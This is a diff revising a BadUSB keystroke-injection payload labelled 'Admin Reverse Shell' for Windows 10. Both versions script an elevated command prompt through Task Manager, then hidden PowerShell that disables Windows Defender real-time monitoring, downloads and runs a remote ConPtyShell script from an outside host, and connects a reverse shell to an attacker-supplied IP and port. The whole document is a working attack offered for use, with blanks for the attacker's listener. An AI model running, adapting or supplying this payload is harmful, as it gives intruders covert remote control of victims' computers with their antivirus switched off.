@@ -1,29 +1,31 @@
-REM Title: Admin Reverse shell
-REM Author: Naitik Dharmendra Joshi
-REM Update: Modified by SoggyCow
-REM Description: Opens cmd and with admin privileges and starts a reverse shell in hidden Powershell window
-REM Target: Windows 10 (CMD, Powershell)
-REM Version: 1.0
-REM Category: General
-REM Change the Following Details.
-REM [LISTENER_IP_ADDRESS] IP Address of the Attacker System.
-REM [PORT] The Port on the target system you want Netcat to listen on.
+REM Title: Admin Reverse Shell  
+REM Author: SoggyCow
+REM Target: Windows 10 (CMD, PowerShell)  
+REM Description: Launches elevated CMD, kills Task Manager, disables Defender, and executes hidden reverse shell via PowerShell  
+REM  
+REM === CONFIGURATION ===  
+REM [LISTENER_IP_ADDRESS] → Attacker's IP address  
+REM [PORT] → Port number for reverse shell connection  
+
 DELAY 300
 GUI r
 DELAY 100
-REM --> Opens Task Manager
+
+REM → Launch Task Manager
 STRING taskmgr
+ENTER
 DELAY 350
+
+REM → Open elevated CMD via Task Manager
 ALT f
-n
+STRING n
 DELAY 250
-REM --> Starts CMD
 STRING cmd
 TAB
-REM --> Turn On Admin Privileges
 SPACE
-REM --> Run
 ENTER
 DELAY 500
-REM --> Kills TaskManager, Executes PowerShell Commands (Hidden), Disables Windows Defender and Executes a Reverse Shell
-STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]");
+
+REM → Execute payload: kill Task Manager, disable Defender, launch reverse shell
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.soggycow.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
+ENTER
